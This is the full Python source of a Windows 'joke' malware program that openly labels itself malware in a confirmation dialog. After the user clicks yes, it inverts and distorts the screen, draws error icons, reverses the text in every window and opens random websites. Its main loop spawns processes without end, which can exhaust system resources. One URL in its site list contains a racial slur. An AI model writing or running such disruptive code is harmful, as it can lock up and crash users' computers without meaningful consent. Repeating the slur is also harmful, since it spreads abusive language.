import os
from time import time
from turtle import width
from win32api import *
from win32gui import *
from win32ui import * 
import ctypes
from ctypes import * 
from win32con import *
from win32file import *
from random import randrange as rd
from random import *
import random
import time
from sys import exit
import multiprocessing
import math
import win32con 
import win32gui


class Data:
    	sites = (
     "https://headshot.monster/CCOCZW",
     "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp",
     "http://pcoptimizerpro.com",
	 "http://softonic.com",
     "http://google.co.ck/search?q=ask+poggersbutnot#4543",
     "https://smartsleepingtips.com/wp-content/uploads/2020/04/cat-biting-persons-hand.jpg",
     "https://google.com/search?q=rats+when+they+see+a+kfc+deep+fryer",
	 "http://google.co.ck/search?q=nigger.com",
	 "http://google.co.ck/search?q=what+happens+if+you+delete+system32",
     "https://grace-ah.com/images/tpb_03.jpg",
     "https://th.bing.com/th/id/OIP.YtmzSpV3d8Pk0TygVddtKQHaFj?pid=ImgDet&w=1024&h=768&rs=1",
     "http://google.co.ck/search?q=how+to+create+your+own+ransomware",
     "https://github.com/Err01-Hub20",
     "https://www.youtube.com/@the-erro1",
	 "calc",
     "control",
	
	)


IconWarning = LoadIcon(None, 32515)
IconError = LoadIcon(None, 32513)

def open_sites():
		global timeSubtract
		sites = Data.sites
		global time
		while True:
			Sleep(20000)
			__import__("os").system("start " + str(choice(sites)))
          
         
def mlt():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    hdc = win32gui.GetDC(0)
    while True:
  
       win32gui.InvertRect(hdc, (0, 0, w ,h))
       Sleep(2000)


def pan_screen():
           
            
            user32 = ctypes.windll.user32
            [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
            hdc = GetDC(0)
            e1 = rd(sw-400)
            e2 = rd(sh-400)
            x3 = rd(sw-800)
            y3 = rd(sw-800)

            width = rd(900)
            hieght = rd(1000)
            while True:
                BitBlt(hdc, e1 -50, e2 -50, width , hieght , hdc, x3 -100, y3 -100, win32con.PATINVERT)
                Sleep(950)
def SCR():
            user32 = ctypes.windll.user32
            [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
            hdc = GetDC(0)
            dx = dy = 1
            angle = 0
            size = 1
            speed = 10
            while True:
    
                BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCCOPY)
                dx = math.ceil(math.sin(angle) * size * 10)
                dy = math.ceil(math.cos(angle) * size * 10)
                angle += speed / 10
                if angle > math.pi :
                 angle = math.pi * -1

def screen_puzzle():
   
    user32 = ctypes.windll.user32
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    hdc = GetDC(0) 
    x1 = rd(sw-100)
    y1 = rd(sh-100)
    x2 = rd(sw-100)
    y2 = rd(sw-100)

    width = rd(600)
    height = rd(600)
    while True:
       BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, win32con.PATINVERT)
       Sleep(700)

def reverse_text():
    global time
    global timeSubtract
    HWND = GetDesktopWindow() 
    while True:
       EnumChildWindows(HWND, EnumChildProc, None)



def error_drawing():
    global time
    global timeSubstract
  
    user32 = ctypes.windll.user32
    [sw,sh] = [user32.GetSystemMetrics(0),user32.GetSystemMetrics(1)] 
    hdc = GetDC(0)
    while True:
        DrawIcon(hdc, rd(sh), rd(sh), IconWarning)
        for i in range(0, 600):
            mouseX,mouseY = GetCursorPos()
            DrawIcon(hdc, mouseX, mouseY, IconError)
            Sleep(10)


def void(): 
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
    hdc = win32gui.GetDC(0)
    dx = dy = 1
    angle = 0
    size = 1
    speed = 5
    while True:
    
       win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx,dy, win32con.SRCAND)
       dx = math.ceil(math.sin(angle) * size * 10)
       dy = math.ceil(math.cos(angle) * size * 10)
       angle += speed / 10
       if angle > math.pi :
        angle = math.pi * -1


def EnumChildProc(hwnd, lParam):
	try: 
		buffering = PyMakeBuffer(255)
		length = SendMessage(hwnd, WM_GETTEXT, 255, buffering) 
		result = str(buffering[0:length*2].tobytes().decode('utf-16')) 
		result = result[::-1]

		SendMessage(hwnd, WM_SETTEXT, None, result) 
	except: pass





def running():

    if MessageBox("The software you just executed is considered malware. If you dont know what a  malware is,press simply No and nothing will happen. ", "FD0", MB_YESNO | MB_ICONWARNING) == 7:
     exit()
	
    else:
        main()



    
def timer():
    time.sleep(23)
  
    

def main():
    while True:

    
        time_thread = multiprocessing.Process(target = timer)
        SCr = multiprocessing.Process(target = SCR)
        drawing_thead = multiprocessing.Process(target = error_drawing)
        panscr = multiprocessing.Process(target = pan_screen)
        reverse = multiprocessing.Process(target = reverse_text)
        bwhell = multiprocessing.Process(target = mlt)
        puzzle_thread = multiprocessing.Process(target = screen_puzzle)
        opensite = multiprocessing.Process(target = open_sites)
        Void = multiprocessing.Process(target = void)
        
        time_thread.start()
     
        
        time.sleep(1)
        opensite.start()
        reverse.start()
      
       
        time.sleep(85)
        bwhell.start()
        time.sleep(6)
        drawing_thead.start()     
        time.sleep(3)
        puzzle_thread.start()  
        time.sleep(5)      
        panscr.start()
        time.sleep(8)
        SCr.start()
        time.sleep(5)
        Void.start()
        
     
    






if __name__ == "__main__":
    running()


    





